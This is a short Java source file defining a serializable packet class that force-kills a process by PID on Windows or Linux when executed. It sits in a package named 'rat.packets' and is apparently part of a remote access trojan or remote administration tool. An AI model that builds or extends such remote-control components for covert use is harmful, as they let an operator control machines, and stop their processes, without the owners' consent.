package rat.packets;

import org.apache.commons.lang3.SystemUtils;

import java.io.IOException;
import java.io.Serializable;

public class KillProcessPacket implements IPacket, Serializable {

    private static final long serialVersionUID = 4868504778163979226L;

    private int pid;

    public KillProcessPacket(int pid) {
        this.pid = pid;
    }

    @Override
    public void execute() {
        if (SystemUtils.IS_OS_WINDOWS) {
            killWindowsProcess();
        } else {
            killLinuxProcess();
        }
    }

    private void killLinuxProcess() {
        try {
            Runtime.getRuntime().exec("kill -9 " + pid).waitFor();
        } catch (InterruptedException | IOException e) {
            e.printStackTrace();
        }
    }

    private void killWindowsProcess() {
        String cmd = "taskkill /F /PID " + pid;
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.KILL_PROCESS;
    }
}
